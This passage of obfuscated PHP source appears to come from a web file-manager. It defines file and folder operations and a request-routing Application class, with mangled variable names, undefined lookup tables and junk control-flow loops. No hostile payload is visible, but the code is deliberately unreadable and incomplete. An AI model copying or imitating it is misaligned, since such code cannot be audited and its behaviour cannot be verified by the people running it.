getPath($Ù’÷ùÈ¤) { return trim($Ù’÷ùÈ¤, $_SERVER[±³—úê][8]); } public function pathFather($ó‰‘Øíø) { $¸‹Ë çæ = $this->parse($ó‰‘Øíø); $¸‹Ë çæ = $this->infoSimple($ó‰‘Øíø); return $¸‹Ë çæ ? $¸‹Ë çæ[$_SERVER[±³—úê][192]] : !1; } public function pathThis($Ñçª”Àõ) { $íÛ×« ù = $this->infoSimple($Ñçª”Àõ); return $íÛ×« ù ? $íÛ×« ù[$_SERVER[±³—úê][32]] : !1; } public function getPathOuter($°äŠë±) { if (!$°äŠë±) { return $°äŠë±; } $ˆ¼“ÕŸª = $this->parse($°äŠë±); return KodIO::make($ˆ¼“ÕŸª[$_SERVER[±³—úê][486]]); } public function copyFolderFromIO($ã®ñÏßµ, $‰‹¸ıëÏ, $Êõ¯ñ“Ş, $Ú»ÆıÚ», $³Šãó„¢) { $ğ¹”©É  = $this->model->copyFolderFromIO($ã®ñÏßµ, $‰‹¸ıëÏ, $Êõ¯ñ“Ş, $Ú»ÆıÚ», $³Šãó„¢); return KodIO::make($ğ¹”©É ); } public function isParentOf($ÛÇˆ”„¿, $¾‰£¦ŒÊ) { return $this->model->isParentOf($ÛÇˆ”„¿, $¾‰£¦ŒÊ); } public function mkfile($£ÈÂÄÍî, $ˆƒú¢í = '', $šõÖˆŸ§ = REPEAT_RENAME) { $Ì§ùš¶ =& $_SERVER[±³—úê]; $Ä ¤İàú = $this->parse($£ÈÂÄÍî); $£ÈÂÄÍî = $Ä ¤İàú[$Ì§ùš¶[486]]; for ($ì­³üÕ = 0; $ì­³üÕ < count($Ä ¤İàú[$Ì§ùš¶[1424]]); $ì­³üÕ++) { $ØÊæùóÃ = $Ä ¤İàú[$Ì§ùš¶[1424]][$ì­³üÕ]; if ($ì­³üÕ == count($Ä ¤İàú[$Ì§ùš¶[1424]]) - 1) { $£ÈÂÄÍî = $this->model->mkfile($£ÈÂÄÍî, $ØÊæùóÃ, $ˆƒú¢í, $šõÖˆŸ§); break; } $£ÈÂÄÍî = $this->model->mkdir($£ÈÂÄÍî, $ØÊæùóÃ, REPEAT_SKIP); } return $this->getPathOuter($£ÈÂÄÍî); } public function mkdir($µÕÂş½, $š÷©‹‰– = REPEAT_SKIP) { $í‘ÇĞ„Á =& $_SERVER[±³—úê]; $úŠğ¥‚ = $this->parse($µÕÂş½); $µÕÂş½ = $úŠğ¥‚[$í‘ÇĞ„Á[486]]; for ($¯şÏŸû = 0; $¯şÏŸû < count($úŠğ¥‚[$í‘ÇĞ„Á[1424]]); $¯şÏŸû++) { $¿Û¹‰ä = $úŠğ¥‚[$í‘ÇĞ„Á[1424]][$¯şÏŸû]; $µÕÂş½ = $this->model->mkdir($µÕÂş½, $¿Û¹‰ä, $š÷©‹‰–); } return $this->getPathOuter($µÕÂş½); } public function copyFile($ÔãİûãÔ, $à†â˜í, $ÔÏÖéÖİ = REPEAT_REPLACE) { $¨­‹´é =& $_SERVER[±³—úê]; $¾ÓÎ¯†à = $this->parse($à†â˜í); $ÎÑ´óîâ = $this->model->copy($ÔãİûãÔ, $¾ÓÎ¯†à[$¨­‹´é[486]], $ÔÏÖéÖİ, $¾ÓÎ¯†à[$¨­‹´é[87]]); return $ÎÑ´óîâ ? $this->getPathOuter($ÎÑ´óîâ) : !1; } public function moveFile($âºùßƒ¯, $ıĞÎÆ…ó, $¾Ï¨Í„ = REPEAT_REPLACE) { $¡Ñ¤ş©ˆ =& $_SERVER[±³—úê]; $“Ã­ó‡Ñ = $this->parse($ıĞÎÆ…ó); $İ÷­°¸´ = $this->model->move($âºùßƒ¯, $“Ã­ó‡Ñ[$¡Ñ¤ş©ˆ[486]], $¾Ï¨Í„, $“Ã­ó‡Ñ[$¡Ñ¤ş©ˆ[87]]); return $İ÷­°¸´ ? $this->getPathOuter($İ÷­°¸´) : !1; } public function copy($‹°ğôÌÎ, $Ç›ÏÈı, $£µÇÉË± = REPEAT_REPLACE, $şãµô« = false) { $ùµíæ¼¸ = $this->parse($Ç›ÏÈı); $û˜‚‹Ã‰ = $this->model->copy($‹°ğôÌÎ, $ùµíæ¼¸[$_SERVER[±³—úê][486]], $£µÇÉË±, $şãµô«); return $û˜‚‹Ã‰ ? $this->getPathOuter($û˜‚‹Ã‰) : !1; } public function moveSameAllow() { } public function move($Ğ®­”ºÂ, $ˆ‰áˆÖæ, $Ûêêµ‰â = REPEAT_REPLACE, $àáù’§È = false) { $œ¼å—ì = $this->parse($ˆ‰áˆÖæ); $çúÓ²ù– = $this->model->move($Ğ®­”ºÂ, $œ¼å—ì[$_SERVER[±³—úê][486]], $Ûêêµ‰â, $àáù’§È); return $çúÓ²ù– ? $this->getPathOuter($çúÓ²ù–) : !1; } public function remove($›ª‰Æ¯, $ø–£şĞñ = true) { return $this->model->remove($›ª‰Æ¯, $ø–£şĞñ); } public function rename($¾É¦õÇ–, $é‰‘ıÛ) { $¦Ûá†Ûû = $this->model->rename($¾É¦õÇ–, $é‰‘ıÛ); return $¦Ûá†Ûû ? $this->getPathOuter($¾É¦õÇ–) : $¦Ûá†Ûû; } public function size($‡öµà”Æ) { $Øèöş”ê = $this->infoSimple($‡öµà”Æ); return $Øèöş”ê ? $Øèöş”ê[$_SERVER[±³—úê][79]] : 0; } public function infoSimple($È£¨«æë) { return $this->model->sourceInfo($È£¨«æë); } public function info($Ì¡¤ŒÊÈ) { return $this->infoParse($Ì¡¤ŒÊÈ); } public function infoAuth($Ç³æéæÍ) { return $this->infoParse($Ç³æéæÍ, !1, !0); } public function infoWithChildren($…„¬ÚŸ°) { return $this->infoParse($…„¬ÚŸ°, !0); } protected function infoParse($ÁŒÔó…Ú, $úÍíàâ‚ = false, $¦ÖïÍ¶û = false) { if (!$úÍíàâ‚) { return $this->model->pathInfo($ÁŒÔó…Ú, $¦ÖïÍ¶û); } return $this->model->pathInfoMore($ÁŒÔó…Ú); } public function infoFullSimple($¸…ŸÂÔ„) { $¿Öúëéõ =& $_SERVER[±³—úê]; $ì’¿Àƒ¹ = explode($¿Öúëéõ[8], $¸…ŸÂÔ„); $˜ôù±”Ò = implode($¿Öúëéõ[8], array_splice($ì’¿Àƒ¹, 1)); return $this->model->pathInfoByPath($ì’¿Àƒ¹[0], $˜ôù±”Ò); } public function infoFull($€‘ËÇä) { $ïßø‹¨Ê = $this->infoFullSimple($€‘ËÇä); return is_array($ïßø‹¨Ê) ? $this->model->pathInfo($ïßø‹¨Ê[$_SERVER[±³—úê][193]]) : !1; } public function hashSimple($à›ƒÏãÁ) { $ó¶Æáˆ¯ =& $_SERVER[±³—úê]; $®Å“§Ó– = $this->infoWithChildren($à›ƒÏãÁ); return $®Å“§Ó–[$ó¶Æáˆ¯[170]][$ó¶Æáˆ¯[686]]; } public function hashMd5($ù“‚Ìşš) { $‚¹âå‚Ó =& $_SERVER[±³—úê]; $ôù¬ëì× = $this->infoWithChildren($ù“‚Ìşš); return $ôù¬ëì×[$‚¹âå‚Ó[170]][$‚¹âå‚Ó[558]]; } public function exist($ÌÜÙÓßÁ) { $ç‘ñÀ—™ =& $_SERVER[±³—úê]; $¡™»Íö¡ = $this->parse($ÌÜÙÓßÁ); if (!$¡™»Íö¡[$ç‘ñÀ—™[87]]) { return $this->isFile($ÌÜÙÓßÁ) || $this->isFolder($ÌÜÙÓßÁ); } $ü«’°¥‰ = array($ç‘ñÀ—™[488] => $¡™»Íö¡[$ç‘ñÀ—™[486]], $ç‘ñÀ—™[32] => $¡™»Íö¡[$ç‘ñÀ—™[87]]); $²’å€‰à = $this->model->where($ü«’°¥‰)->find(); return $²’å€‰à ? !0 : !1; } public function isFile($êßâÇ­Ğ) { $Ò®ğ¶è½ =& $_SERVER[±³—úê]; $å¿¶Œõş = $this->infoSimple($êßâÇ­Ğ); return $å¿¶Œõş && $å¿¶Œõş[$Ò®ğ¶è½[496]] == $Ò®ğ¶è½[240] ? !0 : !1; } public function isFolder($îåï§È›) { $¼æ´öÙö =& $_SERVER[±³—úê]; $óÛ†àğƒ = $this->infoSimple($îåï§È›); return $óÛ†àğƒ && $óÛ†àğƒ[$¼æ´öÙö[496]] == $¼æ´öÙö[91] ? !0 : !1; } public function listPath($ÂÚ·Ğê±, $²åÖ œ = false) { $ğÛÚ÷Ï‘ =& $_SERVER[±³—úê]; if ($ÂÚ·Ğê± == $ğÛÚ÷Ï‘[12]) { return !1; } $ÄëÜİ¼§ = array($ğÛÚ÷Ï‘[488] => $ÂÚ·Ğê±); if ($²åÖ œ) { return $this->model->listSource($ÄëÜİ¼§, -1); } return $this->model->listSource($ÄëÜİ¼§); } public function has($³ ‡â—º, $î—şã‰Ø = false, $©ˆÁ´Ûª = null) { $×ô½Ü€‡ =& $_SERVER[±³—úê]; $å”˜çƒª = $this->infoWithChildren($³ ‡â—º); if ($î—şã‰Ø) { return array($×ô½Ü€‡[252] => $å”˜çƒª[$×ô½Ü€‡[252]], $×ô½Ü€‡[251] => $å”˜çƒª[$×ô½Ü€‡[251]]); } return $©ˆÁ´Ûª ? $å”˜çƒª[$×ô½Ü€‡[252]] : $å”˜çƒª[$×ô½Ü€‡[251]]; } public function listAll($òÒØŞ¤Û) { $€¿†¹Å” = IO::info($this->pathParse[$_SERVER[±³—úê][87]]); if (!$€¿†¹Å”) { return array(); } return $this->model->listAll($òÒØŞ¤Û); } public function getContent($ÌÀ¥›ÕÉ) { return $this->model->getContent($ÌÀ¥›ÕÉ); } public function setContent($ñà’şâ‘, $‚‚çù¢´ = '') { return $this->model->setContent($ñà’şâ‘, $‚‚çù¢´); } public function fileSubstr($Îå©ì™ß, $ÙÅ«š­, $Ôï¸–Ÿ´) { return $this->model->fileSubstr($Îå©ì™ß, $ÙÅ«š­, $Ôï¸–Ÿ´); } public function download($ß‹âŞ¢, $§„àãî = '') { $Õ®¥Ì… = get_path_father($§„àãî); $¹Îğ·ıÚ = get_path_this($§„àãî); $Èë¦È = $this->model->fileInfoGet($ß‹âŞ¢); $™ÂËå°ƒ = IO::copy($Èë¦È[$_SERVER[±³—úê][87]], $Õ®¥Ì…, !1, $¹Îğ·ıÚ); return $™ÂËå°ƒ; } public function setModifyTime($¬Î‹÷è·, $ı—…äß = '') { $õß‚É× =& $_SERVER[±³—úê]; if (!$¬Î‹÷è·) { return; } $this->model->where(array($õß‚É×[502] => $¬Î‹÷è·))->save(array($õß‚É×[88] => $ı—…äß)); } public function upload($°…ëœ¼, $½ üüœ©, $²¶³Ùøı = false, $±¾Ÿ­ì = REPEAT_REPLACE) { $•©°¢È± =& $_SERVER[±³—úê]; $¹»•ñÒÌ = $this->parse($°…ëœ¼); $ßğêÔÆª = $this->model->addFile($¹»•ñÒÌ[$•©°¢È±[486]], $½ üüœ©, $¹»•ñÒÌ[$•©°¢È±[87]], $²¶³Ùøı, $±¾Ÿ­ì); return $this->getPathOuter($ßğêÔÆª); } public function uploadFileByID($÷‚Ç‰õ‚, $Ôú¼ğ€, $Óìİ›Æ) { $Ğ”•×½ =& $_SERVER[±³—úê]; $Ìá·àê = $this->parse($÷‚Ç‰õ‚); $§È»íåš = $this->model->addFileByFileID($Ìá·àê[$Ğ”•×½[486]], $Ôú¼ğ€, $Ìá·àê[$Ğ”•×½[87]], $Óìİ›Æ); return $this->getPathOuter($§È»íåš); } public function addFileByRemote($šÓ÷‡å, $±Á¥ÅÌ, $»Ñ€–¹ = array(), $”†”šé‘ = '', $°ƒ·˜Ñ) { $»ÑÜÈÊà =& $_SERVER[±³—úê]; $»¨Ï°˜© = $this->parse($šÓ÷‡å); $”†”šé‘ = empty($”†”šé‘) ? $»¨Ï°˜©[$»ÑÜÈÊà[87]] : $”†”šé‘; $ÆüŒÆ÷¦ = $this->model->addFileByRemote($»¨Ï°˜©[$»ÑÜÈÊà[486]], $±Á¥ÅÌ, $”†”šé‘, $»Ñ€–¹, $°ƒ·˜Ñ); return $this->getPathOuter($ÆüŒÆ÷¦); } public function uploadLink($¡‰–™îÊ, $Ö†øÔÍ´ = 0) { $Ñƒ÷ŒÚ =& $_SERVER[±³—úê]; $ü”î¾Š = $this->parse($¡‰–™îÊ); $ˆïúîíÒ = _get($GLOBALS[$Ñƒ÷ŒÚ[7]], $Ñƒ÷ŒÚ[1425]); $ˆˆóÆÊ = _get($GLOBALS[$Ñƒ÷ŒÚ[7]], $Ñƒ÷ŒÚ[1426]); $¡‰–™îÊ = Model($Ñƒ÷ŒÚ[688])->createFileName($ü”î¾Š[$Ñƒ÷ŒÚ[87]], $ˆïúîíÒ, $ˆˆóÆÊ); return IO::uploadLink($¡‰–™îÊ, $Ö†øÔÍ´); } public function fileNameAuto($ÖÖ¢ˆû‚, $„©“ØõÈ, $¼˜™Æ³İ = REPEAT_REPLACE, $áÁ¶ó˜… = false) { return $this->model->fileNameAuto($ÖÖ¢ˆû‚, $„©“ØõÈ, $¼˜™Æ³İ, $áÁ¶ó˜…); } public function fileNameExist($ÃáÑ„¦Ğ, $½Ú¦™—¤) { return $this->model->fileNameExist($ÃáÑ„¦Ğ, $½Ú¦™—¤); } protected function _fileOut($áó¶±¦, $ì»Û™÷‡ = false, $ìòŠ¿ = false, $Ú†Òü¡û = '', $‰ÎšåÑÏ = false) { $¹äã­ğ× =& $_SERVER[±³—úê]; $óÀ•›ó = $this->model->sourceInfo($áó¶±¦); if ($óÀ•›ó[$¹äã­ğ×[496]] == $¹äã­ğ×[91]) { header($¹äã­ğ×[1427]); die; } $ë˜•×ç¬ = $this->model->fileInfoGet($áó¶±¦); $Ú†Òü¡û = $ë˜•×ç¬[$¹äã­ğ×[558]] ? $ë˜•×ç¬[$¹äã­ğ×[558]] : $Ú†Òü¡û; $ääôÓÂÔ = isset($GLOBALS[$¹äã­ğ×[182]]) && is_array($GLOBALS[$¹äã­ğ×[182]]) ? $GLOBALS[$¹äã­ğ×[182]][$¹äã­ğ×[32]] : $óÀ•›ó[$¹äã­ğ×[32]]; if ($‰ÎšåÑÏ) { return IO::fileOutServer($ë˜•×ç¬[$¹äã­ğ×[87]], $ì»Û™÷‡, $ääôÓÂÔ, $Ú†Òü¡û); } IO::fileOut($ë˜•×ç¬[$¹äã­ğ×[87]], $ì»Û™÷‡, $ääôÓÂÔ, $Ú†Òü¡û); } public function fileOut($Ã¥°ò¡, $íîŒ°×ø = false, $Í‹‹êÔˆ = false, $óÜêÀ¯ = '') { $this->_fileOut($Ã¥°ò¡, $íîŒ°×ø, $Í‹‹êÔˆ, $óÜêÀ¯); } public function fileOutServer($›Ûô›şÂ, $œ®ÏØËû = false, $Ï©ø€Ãş = false, $ÀµÀøĞõ = '') { $this->_fileOut($›Ûô›şÂ, $œ®ÏØËû, $Ï©ø€Ãş, $ÀµÀøĞõ, !0); } protected function _fileOutImage($¡ÆÎõó, $¬ëñ‡Ö¡ = 250) { $‚Œ¿ôÁ¥ =& $_SERVER[±³—úê]; $£Äñ…´ = $this->model->pathInfo($¡ÆÎõó); if ($£Äñ…´[$‚Œ¿ôÁ¥[496]] == $‚Œ¿ôÁ¥[91]) { show_json($‚Œ¿ôÁ¥[1428] . $¡ÆÎõó, !1); } $™¾ûÄÒ = $this->model->fileInfoGet($¡ÆÎõó); $£Äñ…´[$‚Œ¿ôÁ¥[183]] = $™¾ûÄÒ[$‚Œ¿ôÁ¥[87]]; $GLOBALS[$‚Œ¿ôÁ¥[182]] = $£Äñ…´; IO::fileOutImage($™¾ûÄÒ[$‚Œ¿ôÁ¥[87]], $¬ëñ‡Ö¡); } public function fileOutImage($Ò™ÜäÛ‹, $©î¬ÒæÕ = 250) { $this->_fileOutImage($Ò™ÜäÛ‹, $©î¬ÒæÕ); } public function fileOutImageServer($×…Áï, $ö—ä¤ƒª = 250) { $this->_fileOutImage($×…Áï, $ö—ä¤ƒª); } public function link($ê´¦Œ†¥, $‚çäÓ×• = '') { $´Ì÷Ò†¸ = $this->model->fileInfoGet($ê´¦Œ†¥); return IO::link($´Ì÷Ò†¸[$_SERVER[±³—úê][87]], $‚çäÓ×•); } protected function parse($Å…Çê˜) { $Ô®ÓÓ©İ =& $_SERVER[±³—úê]; if (strstr($Å…Çê˜, $Ô®ÓÓ©İ[8]) === !1) { return array($Ô®ÓÓ©İ[504] => intval($Å…Çê˜), $Ô®ÓÓ©İ[87] => $Ô®ÓÓ©İ[12], $Ô®ÓÓ©İ[1424] => array()); } $¾ûÑœ£ª = explode($Ô®ÓÓ©İ[8], trim($Å…Çê˜, $Ô®ÓÓ©İ[8])); if (count($¾ûÑœ£ª) < 2) { show_tips(clear_html($Å…Çê˜) . $Ô®ÓÓ©İ[1429]); } return array($Ô®ÓÓ©İ[504] => intval($¾ûÑœ£ª[0]), $Ô®ÓÓ©İ[87] => $¾ûÑœ£ª[1], $Ô®ÓÓ©İ[1424] => array_slice($¾ûÑœ£ª, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÄıòŠ¸À) { $this->pathParse = $ÄıòŠ¸À; $this->model = Model($_SERVER[±³—úê][1423]); } public function getPathOuter($„§Æœ®) { $×ó¡˜‘ğ =& $_SERVER[±³—úê]; if (!$„§Æœ®) { return $„§Æœ®; } $ªÙèá¥ë = $this->parse($„§Æœ®); return trim(KodIO::makeShare($this->pathParse[$×ó¡˜‘ğ[486]], $ªÙèá¥ë[$×ó¡˜‘ğ[486]]), $×ó¡˜‘ğ[8]); } protected function infoParse($„ÉÑ”Ô¢, $ó§ĞÂÒ = false, $Šø·¡¡˜ = false) { $ïô¹‚¬é =& $_SERVER[±³—úê]; $ó§ÆùàÈ = $this->pathParse[$ïô¹‚¬é[486]]; $¿˜¼¢Ö½ = trim($this->pathParse[$ïô¹‚¬é[1252]], $ïô¹‚¬é[8]); return Action($ïô¹‚¬é[1430])->sharePathInfo($ó§ÆùàÈ, $¿˜¼¢Ö½, $ó§ĞÂÒ); } public function infoFull($òª‘¶ –) { $Ë­¯Ç¸ò =& $_SERVER[±³—úê]; $ãÓ“¦í = explode($Ë­¯Ç¸ò[8], trim($òª‘¶ –, $Ë­¯Ç¸ò[8])); if (count($ãÓ“¦í) > 1) { $™µœŒ€É = implode($Ë­¯Ç¸ò[8], array_splice($ãÓ“¦í, 1)); $¹áˆ¼ = $this->model->pathInfoByPath($ãÓ“¦í[0], $™µœŒ€É); if (!$¹áˆ¼) { return !1; } $this->pathParse[$Ë­¯Ç¸ò[1252]] = $¹áˆ¼[$Ë­¯Ç¸ò[193]]; } return $this->infoParse($òª‘¶ –); } public function listAll($¾°¼†à) { $ÄÜØ±Îı =& $_SERVER[±³—úê]; $û¡š–œú = IO::info($this->pathParse[$ÄÜØ±Îı[87]]); if (!$û¡š–œú) { return array(); } $Ş„©±Í = $this->model->listAll($¾°¼†à); $Ê’¢ú¡â = Model($ÄÜØ±Îı[678])->getInfo($û¡š–œú[$ÄÜØ±Îı[679]]); foreach ($Ş„©±Í as &$¯ŠØ€Ï) { check_abort(); $¯ŠØ€Ï[$ÄÜØ±Îı[90]] = Action($ÄÜØ±Îı[1430])->_shareItemeParse($¯ŠØ€Ï[$ÄÜØ±Îı[90]], $Ê’¢ú¡â); } unset($¯ŠØ€Ï); return $Ş„©±Í; } } goto f¶ÖØ«ÉÌ‘; aØ•¹™«……: $ezgvpuydct = $_SERVER[±³—úê][697]; class Application { private $defaultModule = "\x69\156\144\145\170"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($Åí¨œËº) { $óá‚—â =& $_SERVER[±³—úê]; $ ƒö¤Ï§ =& $_SERVER[ï¢Â™Û…]; $¾±…ØÍƒ = explode($ ƒö¤Ï§[0], trim($Åí¨œËº, $ ƒö¤Ï§[0])); $Îİúø® = $óá‚—â[698]; if (strlen($Îİúø®) < $óá‚—â[699]) { return; } $this->defaultModule = $¾±…ØÍƒ[0] ? $¾±…ØÍƒ[0] : $this->defaultModule; $this->defaultController = $¾±…ØÍƒ[1] ? $¾±…ØÍƒ[1] : $this->defaultController; $this->defaultAction = $¾±…ØÍƒ[2] ? $¾±…ØÍƒ[2] : $this->defaultAction; $Í•éÄ÷î = $óá‚—â[700]; if (strlen($Í•éÄ÷î) < $óá‚—â[222]) { die; } $this->cloe567e8f07($ ƒö¤Ï§[1], array($this, $ ƒö¤Ï§[2])); $¤ï‚á¬ó = $óá‚—â[701]; if (strlen($¤ï‚á¬ó) < $óá‚—â[699]) { die; } } public function appRun($˜»Ô¦•™) { $°ã•‰¨’ =& $_SERVER[±³—úê]; $¦Ÿ§áØ¬ =& $_SERVER[ï¢Â™Û…]; $ïå÷¾ã = explode($¦Ÿ§áØ¬[0], $˜»Ô¦•™); $½¦ŒŒ‘è = $°ã•‰¨’[702]; while ($½¦ŒŒ‘è < $°ã•‰¨’[222]) { if ($½¦ŒŒ‘è >= 0) { break; } $½¦ŒŒ‘è++; } $èìÒå“¥ = strtolower($ïå÷¾ã[0]); $åô‹ÜÑ½ = $°ã•‰¨’[703]; $åÎ±‡Òı = $¦Ÿ§áØ¬[3]; if ($èìÒå“¥ == $¦Ÿ§áØ¬[4]) { $åÎ±‡Òı = $¦Ÿ§áØ¬[5]; $ïå÷¾ã[0] = $¦Ÿ§áØ¬[6]; $ïå÷¾ã[1] = $ïå÷¾ã[1] . $¦Ÿ§áØ¬[7]; $˜»Ô¦•™ = join($¦Ÿ§áØ¬[0], $ïå÷¾ã); $˜»Ô¦•™ = trim($˜»Ô¦•™, $¦Ÿ§áØ¬[0]); } call_user_func(array($¦Ÿ§áØ¬[8], $¦Ÿ§áØ¬[9]), $åÎ±‡Òı . $¦Ÿ§áØ¬[10], $˜»Ô¦•™); ActionCall($˜»Ô¦•™); call_user_func(array($¦Ÿ§áØ¬[8], $¦Ÿ§áØ¬[9]), $åÎ±‡Òı . $¦Ÿ§áØ¬[11], $˜»Ô¦•™); $ªÚüªñÂ = $°ã•‰¨’[704]; if (strlen($ªÚüªñÂ) < $°ã•‰¨’[699]) { return; } } private function autorun() { $»ªüÆ¡¤ =& $_SERVER[±³—úê]; $†¤àçÅÈ =& $_SERVER[ï¢Â™Û…]; global $config; $½³ŠŒÙÎ = $»ªüÆ¡¤[705]; if (strlen($½³ŠŒÙÎ) < $»ªüÆ¡¤[706]) { die; } if (count($config[$†¤àçÅÈ[12]]) == 0) { return; } foreach ($config[$†¤àçÅÈ[12]] as $ÜÁÄıœ° => $»Ÿ¯Í£„) { $this->appRun($»Ÿ¯Í£„); $Öù†äş = $»ªüÆ¡¤[707]; if (strlen($Öù†äş) < $»ªüÆ¡¤[706]) { die; } } } private function vizqaee5483d() { $æó‹‘ãÓ =& $_SERVER[±³—úê]; $•–Ÿ¤ù« =& $_SERVER[ï¢Â™Û…]; $êÆíëà = $•–Ÿ¤ù«[4]; $®Õµ¥³÷ = $æó‹‘ãÓ[708]; while ($®Õµ¥³÷ < $æó‹‘ãÓ[699]) { if ($®Õµ¥³÷ >= 0) { break; } $®Õµ¥³÷++; } $í‘ç¤Û = $GLOBALS[$•–Ÿ¤ù«[13]][$•–Ÿ¤ù«[14]][0]; $úÖ£Ì–™ = $æó‹‘ãÓ[709]; while ($úÖ£Ì–™ < $æó‹‘ãÓ[710]) { if ($úÖ£Ì–™ >= 0) { break; } $úÖ£Ì–™++; } if (!$í‘ç¤Û || strlen($í‘ç¤Û) <= strlen($êÆíëà)) { return; } if (strtolower(substr($í‘ç¤Û, -strlen($êÆíëà))) != $êÆíëà) { return; } $š’„á¨É = substr($í‘ç¤Û, 0, -strlen($êÆíëà)); $ÀªÕë—ö = array($•–Ÿ¤ù«[4], $š’„á¨É); $ÌÒ×Éå = array_slice($GLOBALS[$•–Ÿ¤ù«[13]][$•–Ÿ¤ù«[14]], 1); $óª¼Åº = $æó‹‘ãÓ[711]; while (strlen($óª¼Åº) < $æó‹‘ãÓ[710]) { if (!$óª¼Åº) { break; } $óª¼Åº++; } $GLOBALS[$•–Ÿ¤ù«[13]][$•–Ÿ¤ù«[14]] = array_merge($ÀªÕë—ö, $ÌÒ×Éå); $GLOBALS[$•–Ÿ¤ù«[13]][$•–Ÿ¤ù«[15]] = implode($•–Ÿ¤ù«[0], $GLOBALS[$•–Ÿ¤ù«[13]][$•–Ÿ¤ù«[14]]); } private function uqnza80d8894() { $¬şöæï =& $_SERVER[±³—úê]; $æˆ½¿ŸÈ =& $_SERVER[ï¢Â™Û…]; if ($GLOBALS[$æˆ½¿ŸÈ[13]][$æˆ½¿ŸÈ[15]] != $æˆ½¿ŸÈ[6]) { return; } $¦Êßî·í = $_SERVER[$æˆ½¿ŸÈ[16]]; $Ûìä É’ = $æˆ½¿ŸÈ[17]; if (!strstr($¦Êßî·í, $Ûìä É’)) { return; } $½›ùµ´‰ = strrpos($¦Êßî·í, $Ûìä É’); $ÎÈ¹ò = $¬şöæï[712]; if (!$ÎÈ¹ò) { die; } $ ›îÊ¾ = substr($¦Êßî·í, $½›ùµ´‰ + strlen($Ûìä É’)); preg_match_all($æˆ½¿ŸÈ[18], $ ›îÊ¾, $‡Ãâöã÷); $ ›îÊ¾ = trim($‡Ãâöã÷[0][0], $æˆ½¿ŸÈ[19]); $Åˆ‚èşÕ = $¬şöæï[713]; if (strlen($Åˆ‚èşÕ) < $¬şöæï[694]) { die; } $GLOBALS[$æˆ½¿ŸÈ[13]][$æˆ½¿ŸÈ[14]] = explode($æˆ½¿ŸÈ[19], $ ›îÊ¾); $”ä÷Çü = $¬şöæï[714]; if (!$”ä÷Çü) { return; } $GLOBALS[$æˆ½¿ŸÈ[13]][$æˆ½¿ŸÈ[15]] = implode($æˆ½¿ŸÈ[0], $GLOBALS[$æˆ½¿ŸÈ[13]][$æˆ½¿ŸÈ[14]]); $Ò€ôõ¹ = $¬şöæï[715]; if (strlen($Ò€ôõ¹) < $¬şöæï[706]) { die; } } public function run() { $Áœ‘–û› =& $_SERVER[±³—úê]; $âŞÜß =& $_SERVER[ï¢Â™Û…]; $this->uqnza80d8894(); $‡¥Ìñ‹ = $Áœ‘–û›[716]; if (!$‡¥Ìñ‹) { return; } $this->vizqaee5483d(); $³È İ Š = $Áœ‘–û›[717]; while (strlen($³È İ Š) < $Áœ‘–û›[706]) { if (!$³È İ Š) { break; } $³È İ Š++; } $À‰‡Ñ— = $GLOBALS[$âŞÜß[13]][$âŞÜß[14]]; $óçö„»© = $Áœ‘–û›[718]; $ªş„­ § = $GLOBALS[$âŞÜß[13]][$âŞÜß[15]]; define($âŞÜß[20], isset($À‰‡Ñ—[0]) && $À‰‡Ñ—[0] ? $À‰‡Ñ—[0] : $this->defaultModule); define($âŞÜß[21], isset($À‰‡Ñ—[1]) && $À‰‡Ñ—[0] ? $À‰‡Ñ—[1] : $this->defaultController); $­Ã ›· = $Áœ‘–û›[719]; while ($­Ã ›· < $Áœ‘–û›[710]) { if ($­Ã ›· >= 0) { break; } $­Ã ›·++; } define($âŞÜß[22], isset($À‰‡Ñ—[2]) && $À‰‡Ñ—[0] ? $À‰‡Ñ—[2] : $this->defaultAction); $ÎöÉ…©ı = $Áœ‘–û›[720]; while (strlen($ÎöÉ…©ı) < $Áœ‘–û›[710]) { if (!$ÎöÉ…©ı) { break; } $ÎöÉ…©ı++; } define($âŞÜß[23], MOD . $âŞÜß[0] . ST . $âŞÜß[0] . ACT); $¤¬çã³µ = $Áœ‘–û›[721]; while (strlen($¤¬çã³µ) < $Áœ‘–û›[710]) { if (!$¤¬çã³µ) { break; } $¤¬çã³µ++; } $_SERVER[$âŞÜß[24]] = strtolower(ACTION); $¤Ÿ¬• = $Áœ‘–û›[722]; $this->autorun(); if (count($À‰‡Ñ—) >= 3) { $this->appRun($ªş„­ §); } else { $this->appRun(ACTION); } } private $fxpj0f983c89 = array(); private $wmnv03962e33 = ''; public function ndiacfcefa51() { $¢¶ßÁã¿ =& $_SERVER[±³—úê]; $££èåìÅ =& $_SERVER[ï¢Â™Û…]; $this->gvmpa7b99284(); $this->hunzc5aaa11c(); $this->adghcd15dfd2(); $this->yvemdb16bf31(); $ú–¿¶ß = $¢¶ßÁã¿[723]; $this->ycivd359b36e(); $ÂÇ‚íœü = $¢¶ßÁã¿[724]; $this->javr78e7a8a9(); $¼Ã™øŠò = $¢¶ßÁã¿[725]; if (!$¼Ã™øŠò) { return; } $this->fegvf5145144(); $this->cloe567e8f07($££èåìÅ[25], array($this, $££èåìÅ[26])); $¶±ŠÚäÎ = $¢¶ßÁã¿[726]; while ($¶±ŠÚäÎ < $¢¶ßÁã¿[710]) { if ($¶±ŠÚäÎ >= 0) { break; } $¶±ŠÚäÎ++; } $this->cloe567e8f07($££èåìÅ[27], array($this, $££èåìÅ[28])); $this->cloe567e8f07($££èåìÅ[29], array($this, $££èåìÅ[30])); $‡ÕçŒËë = $¢¶ßÁã¿[727]; if (strlen($‡ÕçŒËë) < $¢¶ßÁã¿[699]) { return; } $this->cloe567e8f07($££èåìÅ[31], array($this, $££èåìÅ[32])); } public function nydm6e7b1fa9($›¢ÄèëÎ) { $™Ñƒò¶ =& $_SERVER[±³—úê]; $šê¨ˆø” =& $_SERVER[ï¢Â™Û…]; $ ôàÜ¥ = Model($šê¨ˆø”[33])->get(); $ÃŸ›î = array($šê¨ˆø”[34], $šê¨ˆø”[35], $šê¨ˆø”[36], $šê¨ˆø”[37], $šê¨ˆø”[38], $šê¨ˆø”[39], $šê¨ˆø”[40], $šê¨ˆø”[41], $šê¨ˆø”[42], $šê¨ˆø”[43], $šê¨ˆø”[44], $šê¨ˆø”[45], $šê¨ˆø”[46], $šê¨ˆø”[47], $šê¨ˆø”[48], $šê¨ˆø”[49], $šê¨ˆø”[50], $šê¨ˆø”[51], $šê¨ˆø”[52], $šê¨ˆø”[53], $šê¨ˆø”[54], $šê¨ˆø”[55], $šê¨ˆø”[56], $šê¨ˆø”[57], 